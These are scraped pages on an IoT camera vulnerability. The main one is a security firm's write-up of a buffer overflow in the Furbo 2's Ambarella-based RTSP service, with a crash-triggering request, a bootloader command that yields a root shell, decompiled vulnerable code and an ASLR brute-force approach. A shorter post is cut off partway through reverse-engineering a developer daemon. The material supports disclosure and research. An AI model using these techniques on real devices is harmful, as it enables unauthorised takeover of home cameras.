=== Content from github.com_3e1b8c72_20250119_112254.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAmbarella-Inc%2Famba-cve-info%2Ftree%2Fmain%2Fcve-2020-24918)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FAmbarella-Inc%2Famba-cve-info%2Ftree%2Fmain%2Fcve-2020-24918)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Ffiles%2Fdisambiguate&source=header-repo&source_repo=Ambarella-Inc%2Famba-cve-info)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Ambarella-Inc](/Ambarella-Inc)
/
**[amba-cve-info](/Ambarella-Inc/amba-cve-info)**
Public

* [Notifications](/login?return_to=%2FAmbarella-Inc%2Famba-cve-info) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FAmbarella-Inc%2Famba-cve-info)
* [Star
   1](/login?return_to=%2FAmbarella-Inc%2Famba-cve-info)

* [Code](/Ambarella-Inc/amba-cve-info)
* [Issues
  0](/Ambarella-Inc/amba-cve-info/issues)
* [Pull requests
  0](/Ambarella-Inc/amba-cve-info/pulls)
* [Actions](/Ambarella-Inc/amba-cve-info/actions)
* [Projects
  0](/Ambarella-Inc/amba-cve-info/projects)
* [Security](/Ambarella-Inc/amba-cve-info/security)
* [Insights](/Ambarella-Inc/amba-cve-info/pulse)

Additional navigation options

* [Code](/Ambarella-Inc/amba-cve-info)
* [Issues](/Ambarella-Inc/amba-cve-info/issues)
* [Pull requests](/Ambarella-Inc/amba-cve-info/pulls)
* [Actions](/Ambarella-Inc/amba-cve-info/actions)
* [Projects](/Ambarella-Inc/amba-cve-info/projects)
* [Security](/Ambarella-Inc/amba-cve-info/security)
* [Insights](/Ambarella-Inc/amba-cve-info/pulse)

## Files

 main
## Breadcrumbs

1. [amba-cve-info](/Ambarella-Inc/amba-cve-info/tree/main)
/
# cve-2020-24918

/Copy path
## Directory actions

## More options

## Directory actions

## More options

## Latest commit

## History

[History](/Ambarella-Inc/amba-cve-info/commits/main/cve-2020-24918) main
## Breadcrumbs

1. [amba-cve-info](/Ambarella-Inc/amba-cve-info/tree/main)
/
# cve-2020-24918

/Top
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| parent directory[..](/Ambarella-Inc/amba-cve-info/tree/main) | | |
| [readme.txt](/Ambarella-Inc/amba-cve-info/blob/main/cve-2020-24918/readme.txt "readme.txt") | | [readme.txt](/Ambarella-Inc/amba-cve-info/blob/main/cve-2020-24918/readme.txt "readme.txt") |  |  |
| [revision\_of\_fixes.log](/Ambarella-Inc/amba-cve-info/blob/main/cve-2020-24918/revision_of_fixes.log "revision_of_fixes.log") | | [revision\_of\_fixes.log](/Ambarella-Inc/amba-cve-info/blob/main/cve-2020-24918/revision_of_fixes.log "revision_of_fixes.log") |  |  |
| View all files | | |

## [readme.txt](#readme)

```
RTSP library is used for DEMO only, using it in product is a customer's behavior.
Ambarella has emphasized that RTSP is DEMO only library, should NOT be used in product in our document.
Because Ambarella's SDK is proprietary, we didn't publish our SDK source code in public network.

```

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from www.ambarella.com_47cfaff5_20250119_112256.html ===


[![Home](https://www.ambarella.com/wp-content/themes/ambarella/img/content/svgexport-1-1.svg "Home")](https://www.ambarella.com "Home")

* [繁體](https://www.ambarella.com.tw/)
* [简体](https://cn.ambarella.com/)

# Home

* Applications
  + [Automotive](https://www.ambarella.com/applications/automotive/)
  + [Security](https://www.ambarella.com/applications/security/)
  + [Consumer](https://www.ambarella.com/applications/consumer/)
  + [AIoT, Industrial & Robotics](https://www.ambarella.com/applications/aiot-industrial-robotics/)
* [Technology & Development](https://www.ambarella.com/technology/)
  + [Cooper™ Platform](https://www.ambarella.com/cooper/)
  + [Oculii™ AI Radar Platform](https://youtu.be/rCRyoARrcJ4)
  + [CVflow® AI SoC Architecture](/technology#cvflow)
  + [Stereovision](/technology#stereovision)
  + [Low Power](/technology#low-power)
  + [Compression Efficiency](/technology#compression-efficiency)
  + [Image Quality](/technology#image-quality)
  + [Functional Safety](https://www.ambarella.com/technology/#functional-safety)
  + [Computer Vision](/technology#computer-vision)
  + [Autonomy](/technology#autonomy)
  + [SDK and Reference Designs](/technology#sdk-reference-designs)
* Products
  + [Automotive](https://www.ambarella.com/products/automotive/)
  + [Security](https://www.ambarella.com/products/security/)
  + [Consumer](https://www.ambarella.com/products/consumer/)
  + [AIoT, Industrial & Robotics](https://www.ambarella.com/products/aiot-industrial-robotics/)
* Company
  + [About / History](https://www.ambarella.com/about-history/)
  + [Company Life](https://www.ambarella.com/company-life/)
  + [Executive Team](https://www.ambarella.com/executive-team/)
  + [Board of Directors](https://www.ambarella.com/board-of-directors/)
  + [Blog](https://www.ambarella.com/blog/)
  + [Careers](https://ebeg.fa.us2.oraclecloud.com/hcmUI/CandidateExperience/en/sites/CX_1)
  + [Investors](http://investor.ambarella.com/)
  + [Sustainability](https://www.ambarella.com/sustainability/)
  + [News & Events](/news-events/)
  + [Contact Us](https://www.ambarella.com/contact-us/)

# AI Vision Processors For Edge Applications

Our solutions make cameras smarter by extracting valuable data from high-resolution video streams.

[Explore our Technologies](https://www.ambarella.com/technology/)
Explore our key applications

[Automotive](https://www.ambarella.com/applications/automotive/)[Security](https://www.ambarella.com/applications/security/)[Consumer](https://www.ambarella.com/applications/consumer/)[IoT, Industrial & Robotics](https://www.ambarella.com/applications/aiot-industrial-robotics/)

People

Signs
Objects
Vehicles

Environment & depth

Replay

360-degree object detection
At long range
And short range

## From ADAS to Autonomy

With advanced driver assistance systems, smart electronic mirrors, drive recorders, autonomous vehicles and more, Ambarella is committed to preparing you for the road ahead.

[Discover now](https://www.ambarella.com/applications/automotive/)

Replay

 PersonKnown suspectCrowd3 peoplePersonLoiteringPersonVIPLuggage5 min unattendedSuspicious

## Smart Surveillance Solutions

Our intelligent video devices use face detection, analytics, and multi-object CNN classification to enhance security in businesses and homes, without the need for the cloud.

[Discover now](https://www.ambarella.com/applications/security/)

Replay

## News & Events

[Jan
07
### Ambarella Expands N1 Edge GenAI Family With SoC Targeted at On-Premise Multi-Channel VLM and NN Processing in Under 20 Watts](https://www.ambarella.com/news/ambarella-expands-n1-edge-genai-family-with-soc-targeted-at-on-premise-multi-channel-vlm-and-nn-processing-in-under-20-watts/)

[Dec
04
### LG AND AMBARELLA JOIN FORCES TO ADVANCE AI-DRIVEN IN-CABIN VEHICLE SAFETY SOLUTIONS](https://www.ambarella.com/news/lg-and-ambarella-join-forces-to-advance-ai-driven-in-cabin-vehicle-safety-solutions/)

[Nov
26
### Ambarella, Inc. Announces Third Quarter Fiscal Year 2025 Financial Results](https://ambarella.gcs-web.com/news-releases/news-release-details/ambarella-inc-announces-third-quarter-fiscal-year-2025-financial)

* [Contact Us](https://www.ambarella.com/contact-us/)
* [Careers](https://ebeg.fa.us2.oraclecloud.com/hcmUI/CandidateExperience/en/sites/CX_1)
* [Accessibility](https://www.ambarella.com/accessibility/)
* [Privacy](https://www.ambarella.com/privacy/)

© 2025 Ambarella International LP. All rights reserved.



=== Content from somersetrecon.squarespace.com_57b95a5e_20250119_112255.html ===


* [Home](/)
* [Blog](/blog)
* [Industries](/industries)
* [Services](/services)
* [About](/about)
* [Contact](/contact)
* [Careers](/careers)

* [Home](/)
* [Blog](/blog)
* [Industries](/industries)
* [Services](/services)
* [About](/about)
* [Contact](/contact)
* [Careers](/careers)

# [Somerset Recon](/)

## Security Analysis and Reverse-Engineering

# Hacking the Furbo Dog Camera: Part I

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618444994807-2H8B1OWU3S4NDEF49NC9/DSC_0773.JPG)

The [Furbo](https://shopus.furbo.com/products/furbo-dog-camera) is a treat-tossing dog camera that originally started gaining traction on [Indegogo](https://www.indiegogo.com/projects/furbo-world-s-best-treat-tossing-dog-camera) in 2016. Its rapid success on the crowdfunding platform led to a public release later that year. Now the Furbo is widely available at Chewy and Amazon, where it has been a #1 best seller. The Furbo offers 24/7 camera access via its mobile application, streaming video and two-way audio. Other remote features include night vision, dog behavior monitoring, emergency detection, real-time notifications, and the ability to toss a treat to your dog. Given the device's vast feature set and popularity, Somerset Recon purchased several Furbos to research their security. This blog post documents a vulnerability discovered in the RTSP server running on the device. The research presented here pertains to the Furbo model: **Furbo 2**.

Once we got our hands on a couple of Furbos we began taking a look at the attack surface. Initially, the Furbo pairs with a mobile application on your phone via Bluetooth Low Energy (BLE), which allows the device to connect to your local WiFi network. With the Furbo on the network a port scan revealed that ports 554 and 19531 were listening. Port 554 is used for [RTSP](https://en.wikipedia.org/wiki/Real_Time_Streaming_Protocol) which is a network protocol commonly used for streaming video and audio. Initially the RTSP service on the Furbo required no authentication and we could remotely view the camera feed over RTSP using the VLC media player client. However, after an update and a reset the camera required authentication to access the RTSP streams.

The RTSP server on the Furbo uses HTTP digest authentication. This means that when connecting with an RTSP client, the client needs to authenticate by providing a username and password. The client utilizes a realm and nonce value sent by the server to generate an authentication header, which gets included in the request. With this in mind, we decided to try to identify a vulnerability in the RTSP service.

## Crash

The crash was discovered by manually fuzzing the RTSP service. A common tactic in discovering stack or heap overflows is sending large inputs, so we fired off some requests with large usernames and much to our delight we saw the RTSP service reset. We eventually determined that a username of over 132 characters resulted in the RTSP service crashing due to improper parsing of the authentication header. An example request can be seen below:

```
DESCRIBE rtsp://192.168.1.85:554/stream RTSP/1.0\r\n
CSeq: 7\r\n
Authorization: Digest username="AAAAAAAAAAAAAAAAAAAAAAA<+500>", realm="chicony.com", nonce="40b5d14d3bb07ca3", uri="rtsp://192.168.1.85:554/stream", response="981c9a2611617e5faf11be29407a4b8e"\r\n

```

At this point we wanted to obtain shell access on the Furbo to triage the crash and develop an exploit. To do so we shifted gears and took a look at the hardware.

## Reverse Engineering Hardware to Gain Root Access

An important and helpful first step in attacking the Furbo, and most IoT devices, is obtaining a root shell or some other internal access to the device. Doing so can help elucidate processes, data, or communication which are otherwise obfuscated or encrypted. We focused our efforts on gaining root access to the Furbo by directly attacking the hardware which contains several interconnected printed circuit boards (PCBs). There are three PCBs that we analyzed.

The back PCB contains the reset switch and USB Micro-B port, which can be used to power the Furbo as show here:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618446490073-AGOJQCB8J1WSQMQAP5GZ/DSC_0550.jpg)

Note the non-populated chips and connectors. We traced these to see if any of them provided serial access, but they turned out to link to the USB controller’s D+ and D- lines. These connectors are probably used during manufacturing for flashing, but they did not give us the serial access we were searching for.

The central PCB acts as the hub connecting other PCBs as shown here:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618447461579-AOCK80Q38IIBRGWBYIPD/DSC_0592_brighter.jpg)

It contains relays, power regulators, an adjustment potentiometer, and a [PIC16F57](https://www.microchip.com/wwwproducts/en/PIC16F57). Based on initial reverse engineering, this chip appears to control physical components such as the LED status bar, the treat shooter, and the mechanical switch that detects the treat shooter's motion.

The top PCB of the Furbo contains the large, visible-wavelength camera as shown here:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618448455486-XRGF1229ZAL1OLUOQW4L/DSC_0577.jpg)

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618448562010-Q36MIJSIPJFIJN4XLGBH/DSC_0583.jpg)

The board shown above supports Wi-Fi and Bluetooth, as evidenced by the connected patch antenna located on the side of the Furbo. The PCB also contains the main System on Chip (SoC) which performs the high level functions of the Furbo. The SoC is an [Ambarella S2Lm](https://www.ambarella.com/wp-content/uploads/S2Lm-Product-Brief-Final.pdf).

The Ambarella SoC is the primary target: as a highly-capable ARM Cortex-A9 SoC running Linux (compared to the fairly limited PIC16 and wireless chips), it likely performs all the important functions of the Furbo, and hopefully contains an accessible TTY shell (serial access). As with many new complex or custom SoCs, detailed datasheets and specifications for the Ambarella chips are difficult to find. Instead we attached a Logic Analyzer to various test points until we located the UART TTY TX pin with a baud rate of 115200. From here we found the receive (RX) pin by connecting an FTDI to adjacent pins until a key press was registered on the serial terminal. The resulting serial access test points were located on the bottom left of the board as shown in the figure below:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618450140952-FM4ELVLO1G1L4JPERBYN/DSC_0583_lines.png)

We soldered on some wires to the test points circled above and had reliable serial access to the Ambarella SoC. The resulting boot log sequence is seen here:

As we can see above, the boot log sequence starts with the AMBoot bootloader. It is similar to [Das U-Boot](https://www.denx.de/wiki/U-Boot), but custom built by Ambarella. It will load images from NAND flash, and then boot the Linux v3.10.73 kernel. In the boot log note the line indicating the parameters used by AMBoot to initiate the Linux kernel:

```
[0.000000] Kernel command line: console=ttyS0 ubi.mtd=lnx root=ubi0:rootfs rw rootfstype=ubifs init=/linuxrc video=amb0fb:720x480,720x480,1,0
```

The Linux terminal is protected by login credentials, but the process can be interrupted causing the Furbo to enter the AMBoot bootloader. See [here](https://blog.includesecurity.com/2014/04/) for a similar demonstration of accessing a root shell from AMBoot. For the Furbo this can be done by pressing Enter at the TTY terminal immediately after reset, leading to the AMBoot terminal shown here:

```
amboot> boot console=ttyS0 ubi.mtd=lnx root=ubi0:rootfs rw rootfstype=ubifs init=/bin/sh video=amb0fb:720x480,720x480,1,0
```

Utilizing the AMBoot “boot” command with **init=/bin/sh,** as shown above, will bypass the Linux login prompt and boot directly into a root shell. The result of which can be seen here:

Once a root shell is accessible, a persistent root user can be created by adding or modifying entries in **/etc/passwd** and **/etc/shadow**. This persistent root shell can then be accessed via the normal Linux login prompt.

## Debugging & Reverse Engineering

Now that we had shell access to the device, we looked around and got an understanding of how the underlying services work. An executable named **apps\_launcher** is used to launch multiple services, including the **rtsp\_svc** (RTSP server). These processes are all monitored by a watchdog script and get restarted if one crashes. We found that manually starting the **apps\_launcher process** revealed some promising information.

It was here that we noticed that service **rtsp\_svc** seemed to segfault twice before fully crashing. Note the segfault addresses are set to **0x41414141** indicating a successful buffer overflow, and the possibility of controlling program flow. To do so we needed to start the process of debugging and reversing the RTSP service crash.

From the information gathered so far, we were fairly confident we had discovered an exploitable condition. We added statically compiled dropbear-ssh and gdbserver binaries to the Furbo to aid in debugging and dove in. We connected to gdbserver on the Furbo from a remote machine using gdb-multiarch and [GEF](https://gef.readthedocs.io/en/master/) and immediately saw that we had a lot to work with:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618453175802-AOI92SY1F6WNXCSK2KO7/500_As_gdb.png)

Note that the presence of the username's "A"'s throughout, implying that the contents of the program counter **($pc)**, stack **($sp)**, and registers **$r4** through **$r11** could be controlled. Using a cyclic pattern for the username indicated the offset of each register that could be controlled. For example, the offset of the program counter was found to be 164 characters.

The link register **($lr)** indicates that the issue is found in the **parse\_authenticaton\_header()** function. This function was located in the **libamprotocol-rtsp.so.1** file. We pulled this file off of the Furbo to take a look at what was happening. Many of the file and function names utilized by the RTSP service indicate that they are part of the Ambarella SDK. Below is a snippet of the vulnerablefunction decompiled with Ghidra.

```
... snippet start ...

  size_t sizeof_str;
  int int_result;
  size_t value_len;
  undefined4 strdupd_value;
  int req_len_;
  char *req_str_;
  char parameter [128];
  char value [132];
  char update_req_str;

... removed for brevity ...

      while( true ) {
        memset(parameter,0,0x80);
        memset(value,0,0x80);
        int_result = sscanf(req_str_,"%[^=]=\"%[^\"]\"",parameter); //ghidra missed value argument here
        if ((int_result != 2) &&
           (int_result = sscanf(req_str_,"%[^=]=\"\"",parameter), int_result != 1)) break;
        sizeof_str = strlen(parameter);
        if (sizeof_str == 8) {
          int_result = strcasecmp(parameter,"username");
          if (int_result == 0) {
            if (*(void **)(header + 0xc) != (void *)0x0) {
              operator.delete[](*(void **)(header + 0xc));
            }
            strdupd_value = amstrdup(value);
            *(undefined4 *)(header + 0xc) = strdupd_value;
            sizeof_str = strlen(parameter);
          }

... snippet end ...

```

Assuming we have sent a request with a username full of ”A’s”, when it first hits the snippet shown, it will have stripped off everything in the request up until the username parameter. Note **req\_str\_** in the highlighted section is a pointer to username="AAAAAAAAAA<+500>".

It’s worth mentioning that Ghidra appeared to misinterpret the arguments for [**sscanf()**](https://overiq.com/c-programming-101/the-sscanf-function-in-c/) in this instance, as there should be two locations listed: **parameter** and **value**. The first format specifier parses out the parameter name such as **username** and stores it in **parameter.** The second format specifier copies the actual parameter value such as **AAAAAAAAAAA** and stores it in the location of **value,** which is only allocated 132 bytes. There is no length check, resulting in the buffer overflowing. When the function returns the service crashes as the return address was overwritten with the characters from the overflowed username in \***req\_str**.

Additional information was gathered to craft a working PoC. The camera uses address space layout randomization ([ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization)) and the shared objects were compiled with no-execute ([NX](https://en.wikipedia.org/wiki/NX_bit)). The **rtsp\_svc** binary was not compiled with the position-independent executable ([PIE](https://en.wikipedia.org/wiki/Position-independent_code)) flag; however, the address range for the executable contains two leading null bytes (0x000080000) which unfortunately cannot be included in the payload. This means utilizing return-oriented programming ([ROP](https://en.wikipedia.org/wiki/Return-oriented_programming)) in the text section to bypass ASLR would be difficult, so we aimed to find another way.

## Proof of Concept

As part of the triaging process, we disabled ASLR to see if we could craft a working exploit. With just 3 ROP gadgets from libc, we were able to gain code execution:

From here, we still wanted to find a way to exploit this with no prior access to the device (when ASLR is enabled). Ideally, we would have found some way to leak an address, but we did not find a way to accomplish that given the time invested.

As mentioned earlier, one of the behaviors we noticed was that the **rtsp\_svc** executable would stay running after the first malformed payload, and would not fully crash until the second. Additionally, after the second request, the RTSP service would reset and the RTSP service would come back up. We confirmed this was because the **rtsp\_svc** is run with a watchdog script.

Next, we checked the randomness of the libc address each time the service is run and found that 12 bits were changing. The addresses looked something like 0x76**CXX**000 where **XX** varied and sometimes the highlighted **C** would be a **D**. Taking all this into account, we crafted an exploit with two hardcoded libc base addresses that would be tried over and over again until the exploit was successful. If we consider that 12 bits can change between resets, there is a 1 in 4096 chance for the exploit to work. So we patiently waited as shown in the picture below:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618453452414-T3DR64XXBX7MSAJHAGGQ/bo_watin_for_shellz.JPG)

In testing, it took anywhere from 2 minutes to 4 hours. Occasionally, the **rtsp\_svc** executable would end up in a bad state requiring a full power cycle by unplugging the camera. This did not seem to happen after initial discovery, however since that time, multiple firmware updates have been issued to the Furbo (none fixed the vulnerability), which may have something to do with that behavior. Below is a screenshot showing the exploit running against an out of the box Furbo 2 and successfully gaining a shell:

![](https://images.squarespace-cdn.com/content/v1/543effd8e4b095fba39dfe59/1618454595926-ZIIFYWNZT74VWMUJGAKV/aslr_shell.png)

Finally, here is a video demonstrating the exploit in action side-by-side with a Furbo. To create a more clear and concise video the demo below was executed with ASLR disabled.

We’ve made all the code available in our [github repository](https://github.com/Somerset-Recon/furbo-research) if you want to take a look or attempt to improve the reliability!

## Disclosure

Given the impact of this vulnerability we reached out to the Furbo Security Team. Here is the timeline of events for this discovery.

As you can see, after exchanging emails sharing the details of the vulnerability with the Furbo Security Team, communications soon dropped off. Multiple follow up attempts went unanswered. The Furbo Security Team indicated that they had notified Ambarella of the vulnerability, but never followed up with us. Our own attempts to contact Ambarella directly went unanswered. At the time of posting, we are still looking to get in contact with Ambarella. This buffer overflow likely exists in the Ambarella SDK, which could potentially affect other products utilizing Ambarella chipsets.

## Conclusion

The Furbo 2 has a buffer overflow in the RTSP Service when parsing the RTSP authentication header. Upon successful exploitation, the attacker is able to execute code as root and take full control of the Furbo 2. There are many features that can be utilized from the command line including, but not limited to, recording audio and video, playing custom sounds, shooting out treats, and obtaining the RTSP password for live video streaming.

Since the discovery of this exploit the Furbo has had multiple firmware updates, but they do not appear to have patched the underlying RTSP vulnerability. The reliability of our exploit has decreased because the RTSP service on the test devices more frequently goes into a bad state requiring the device to be fully power cycled before continuing. Additionally, Tomofun has released the Furbo 2.5T. This new model has upgraded hardware and is running different firmware. While the buffer overflow vulnerability was not fixed in code, the new Furbo 2.5T model no longer restarts the RTSP service after a crash. This mitigation strategy prevents us from brute-forcing ASLR, and prevents our currently released exploit from running successfully against Furbo 2.5T devices.

After realizing how much the Furbo 2.5T changed, we decided to reassess the new devices. We found a host of new vulnerabilities that will be the focus of Hacking the Furbo Dog Camera: Part II!

Here’s a bonus video featuring Sonny the Golden Retriever!

Posted on April 26, 2021 by [Somerset Recon](/blog?author=543effd6e4b048b8ecb76bc8).

[Newer](/blog/2021/hacking-the-furbo-dog-camera-part-ii) / [Older](/blog/2019/8/5/layerone-2019-ctf-log-viewer)

## [Follow us on Twitter!](https://twitter.com/somersetrecon)

---

## Mailing List

Keep up to date on our newest work.  We send out a summary no more frequently than once a month.  And we'd never use your info for anything sinister.  We promise.

Thank you!

---

Want to say hi? Click on the button below to contact us with any questions you may have.

[Contact Somerset Recon](http://www.somersetrecon.com/contact/)

### Learn

[Home](/home)

[Industries](/industries)

[Services](/services)

[About](/about)

[Careers](/careers)

### Connect

[Twitter](https://twitter.com/SomersetRecon)

[Contact](/contact)

### Sign up for the latest news

Thank you!

---

© Somerset Recon, Inc



=== Content from www.somersetrecon.com_f9d51311_20250119_112257.html ===


* [Home](/)
* [Blog](/blog)
* [Industries](/industries)
* [Services](/services)
* [About](/about)
* [Contact](/contact)
* [Careers](/careers)

* [Home](/)
* [Blog](/blog)
* [Industries](/industries)
* [Services](/services)
* [About](/about)
* [Contact](/contact)
* [Careers](/careers)

# [Somerset Recon](/)

## Security Analysis and Reverse-Engineering

# [Automated Bug Hunting With Semgrep](/blog/2024/automated-bug-hunting-with-semgrep)

This presentation covers a static analysis tool Semgrep and how it can be leveraged to find different vulnerabilities in a variety of languages. We initially presented “Automated Bug Hunting with Semgrep” at a local event in San Diego. Due to the positive feedback, a video and similar presentation slides were created to help educate a larger audience of software developers and security professionals on the benefits of Semgrep and its automated source code analysis features. Enjoy!

For keyboard control help menu, press "?" (fullscreen disabled).

Posted on August 23, 2024 by [Ethan Morchy](/blog?author=66bfeb10e799c4023a400fa2) and tagged [Vulnerability Analysis](/blog?tag=Vulnerability+Analysis) [Semgrep](/blog?tag=Semgrep).

# [Reverse Engineering The Unicorn](/blog/2024/6/5/reversing-the-unicorn)

While reversing a device, we stumbled across an interesting binary named **unicorn**. The binary appeared to be a developer utility potentially related to the Augentix SoC SDK. The unicorn binary is only executed when the device is set to developer mode. Fortunately, this was not the default setting on the device we were analyzing. However, we were interested in the consequences of a device that could have been misconfigured.

## Discovering the Binary

While analyzing the firmware, we noticed that different services will start upon boot depending on what **mode** the device is set to.

```
...SNIPPET...

rcS() {
	# update system mode if a new one exists
	$MODE -u
	mode=$($MODE)
	echo "Current system mode: $mode"

	# Start all init scripts in /etc/init.d/MODE
	# executing them in numerical order.
	#
	for i in /etc/init.d/$mode/S??* ;do

		# Ignore dangling symlinks (if any).
		[ ! -f "$i" ] && continue
		case "$i" in
		*.sh)
		    # Source shell script for speed.
		    (
			trap - INT QUIT TSTP
			set start
			. $i
		    )
		    ;;
		*)
		    # No sh extension, so fork subprocess.
		    $i start
		    ;;
		esac
	done

...SNIPPET...
```

If the device boots in **factory** or **developer** mode, some additional remote services such as telnetd, sshd, and the unicorn daemon are started. The unicorn daemon listens on port 6666 and attempting to manually interact with the binary didn’t yield any interesting results. So we popped the binary into Ghidra to take a look at what was happening under the hood.

## Reverse Engineering the Binary

From the main function we see that if the binary is run with no arguments, it will run as a daemon.

```
int main(int argc,char **argv)

{
  uint uVar1;
  int iVar2;
  ushort **ppuVar3;
  size_t sVar4;
  char *pcVar5;
  char local_8028 [16];

  memset(local_8028,0,0x8000);
  if (argc == 1) {
    openlog("unicorn",1,0x18);
    syslog(5,"unicorn daemon ready to serve!");
                    /* WARNING: Subroutine does not return */
    start_daemon_handle_client_conns();
  }
  while( true ) {
    while( true ) {
      while( true ) {
        iVar2 = getopt(argc,argv,"hsg:c:");
        uVar1 = optopt;
        if (iVar2 == -1) {
          openlog("unicorn",1,0x18);
          syslog(5,"2 unicorn daemon ready to serve!");
                    /* WARNING: Subroutine does not return */
          start_daemon_handle_client_conns();
        }
        if (iVar2 != 0x67) break;
        local_8028[0] = '{';
        local_8028[1] = '\"';
        local_8028[2] = 'm';
        local_8028[3] = 'o';
        local_8028[4] = 'd';
        local_8028[5] = 'u';
        local_8028[6] = 'l';
        local_8028[7] = 'e';
        local_8028[8] = '\"';
        local_8028[9] = ':';
        local_8028[10] = ' ';
        local_8028[11] = '\"';
        pcVar5 = stpcpy(local_8028 + 0xc,optarg);
        memcpy(pcVar5,"\"}",3);
        sVar4 = FUN_00012564(local_8028,0xffffffff);
        if (sVar4 == 0xffffffff) {
          syslog(6,"ccClientGet failed!\n");
        }
      }
      if (0x67 < iVar2) break;
      if (iVar2 == 0x3f) {
        if (optopt == 0x73 || (optopt & 0xfffffffb) == 99) {
          fprintf(stderr,"Option \'-%c\' requires an argument.\n",optopt);
        }
        else {
          ppuVar3 = __ctype_b_loc();
          if (((*ppuVar3)[uVar1] & 0x4000) == 0) {
            pcVar5 = "Unknown option character \'\\x%x.\n";
          }
          else {
            pcVar5 = "Unknown option \'-%c\'.\n";
          }
          fprintf(stderr,pcVar5,uVar1);
        }
        return 1;
      }
      if (iVar2 != 99) goto LAB_0000bb7c;
      sprintf(&DAT_0008c4c4,optarg);
    }
    if (iVar2 == 0x68) {
      USAGE();
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    if (iVar2 != 0x73) break;
    DAT_0008d410 = 1;
  }
LAB_0000bb7c:
  puts("aborting...");
                    /* WARNING: Subroutine does not return */
  abort();
}
```

If the argument passed is -h (0x68), then it calls the usage function:

```
void USAGE(void)

{
  puts("Usage:");
  puts("\t To run unicorn as daemon, do not use any args.");
  puts("\t\'-g get \'\t get product setting. D:img_pref");
  puts("\t\'-s set \'\t set product setting. D:img_pref");
  putchar(10);
  puts("\tSample usage");
  puts("\t$ unicorn -g img_pref");
  return;
}

```

When no arguments are passed, a function is called that sets up and handles client connections, which can be seen above renamed as **start\_daemon\_handle\_client\_conns();.** Most of the code in the **start\_daemon\_handle\_client\_conns()** function is handling and setting up client connections. There is a small portion of the code that performs an initial check of the data received to see if it matches a specific string **AgtxCrossPlatCommn**.

```
                  else {
                    ptr_result = strstr(DATA_FROM_CLIENT,"AgtxCrossPlatCommn");
                    syslog(6,"%s(): \'%s\'\n","interpretData",DATA_FROM_CLIENT);
